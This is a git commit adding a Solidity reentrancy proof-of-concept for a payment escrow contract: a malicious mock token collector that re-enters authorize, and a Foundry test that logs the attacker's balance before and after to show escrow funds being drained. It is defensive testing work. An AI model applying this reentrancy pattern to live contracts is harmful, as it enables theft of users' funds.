c778c20da8ae6c16552b31b88ac52bd4598c63dd
Amie Corso <amie.corso@coinbase.com>
2025-04-02 15:56:21 -0700

    clean up reentrancy PoC a bit

---
+++ test/mocks/ReentrantTokenCollector.sol
@@ -0,0 +1,36 @@
+// SPDX-License-Identifier: GPL-3.0
+pragma solidity ^0.8.13;
+
+import {TokenCollector} from "../../src/collectors/TokenCollector.sol";
+import {Test} from "forge-std/Test.sol";
+import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
+import {PaymentEscrow} from "../../src/PaymentEscrow.sol";
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+
+contract ReentrantTokenCollector is Test, TokenCollector {
+    constructor(address _paymentEscrow) TokenCollector(_paymentEscrow) {}
+
+    bool called = false;
+
+    function collectTokens(
+        bytes32 paymentInfoHash,
+        PaymentEscrow.PaymentInfo calldata paymentInfo,
+        uint256,
+        bytes calldata
+    ) external override onlyPaymentEscrow {
+        if (!called) {
+            called = true;
+            PaymentEscrow.PaymentInfo memory paymentInfo2 = paymentInfo; // calldata is read-only
+            paymentInfo2.salt += 1; // avoid hash repeat
+            vm.prank(address(paymentInfo.operator));
+            paymentEscrow.authorize(paymentInfo2, 10 ether, address(this), "");
+        } else {
+            called = false;
+            IERC20(paymentInfo.token).transfer(address(paymentEscrow), paymentInfo.maxAmount);
+        }
+    }
+
+    function collectorType() external pure override returns (TokenCollector.CollectorType) {
+        return TokenCollector.CollectorType.Payment;
+    }
+}
---
+++ test/src/PaymentEscrow/reentrancy.t.sol
@@ -0,0 +1,59 @@
+// SPDX-License-Identifier: GPL-3.0
+pragma solidity ^0.8.13;
+
+import {PaymentEscrowSmartWalletBase} from "../../base/PaymentEscrowSmartWalletBase.sol";
+import {PaymentEscrow} from "../../../src/PaymentEscrow.sol";
+import {PreApprovalPaymentCollector} from "../../../src/collectors/PreApprovalPaymentCollector.sol";
+import {ReentrantTokenCollector} from "../../../test/mocks/ReentrantTokenCollector.sol";
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import {console} from "forge-std/console.sol";
+
+contract ReentrancyApproveTest is PaymentEscrowSmartWalletBase {
+    ReentrantTokenCollector reentrantTokenCollector;
+    address attacker;
+    uint256 attackerPrivateKey;
+
+    function setUp() public override {
+        super.setUp();
+        reentrantTokenCollector = new ReentrantTokenCollector(address(paymentEscrow));
+        attackerPrivateKey = 0x123;
+        attacker = vm.addr(attackerPrivateKey);
+        // label the attacker and evil collector as evil
+        vm.label(attacker, "ATTACKER");
+        vm.label(address(reentrantTokenCollector), "REENTRANT COLLECTOR");
+    }
+
+    function test_reentrancy() public {
+        uint120 amount = 10 ether;
+        mockERC3009Token.mint(address(paymentEscrow), amount); // give escrow liquidity
+        mockERC3009Token.mint(address(reentrantTokenCollector), amount); // give evil collector enough liquidity for attack
+
+        PaymentEscrow.PaymentInfo memory paymentInfo = PaymentEscrow.PaymentInfo({
+            operator: attacker,
+            payer: attacker,
+            receiver: attacker,
+            token: address(mockERC3009Token),
+            maxAmount: amount,
+            preApprovalExpiry: type(uint48).max,
+            authorizationExpiry: type(uint48).max,
+            refundExpiry: type(uint48).max,
+            minFeeBps: 0,
+            maxFeeBps: 0,
+            feeReceiver: address(0),
+            salt: 0
+        });
+
+        console.log("Initial Attacker Balance:     ", mockERC3009Token.balanceOf(attacker));
+        vm.prank(attacker);
+        paymentEscrow.authorize(paymentInfo, 10 ether, address(reentrantTokenCollector), "");
+
+        vm.startPrank(attacker);
+        paymentEscrow.capture(paymentInfo, 10 ether, paymentInfo.minFeeBps, paymentInfo.feeReceiver);
+        paymentInfo.salt += 1;
+        paymentEscrow.capture(paymentInfo, 10 ether, paymentInfo.minFeeBps, paymentInfo.feeReceiver);
+        vm.stopPrank();
+
+        console.log("After attack Attacker Balance:", mockERC3009Token.balanceOf(attacker));
+        console.log("Final Escrow Balance:       ", mockERC3009Token.balanceOf(address(paymentEscrow)));
+    }
+}
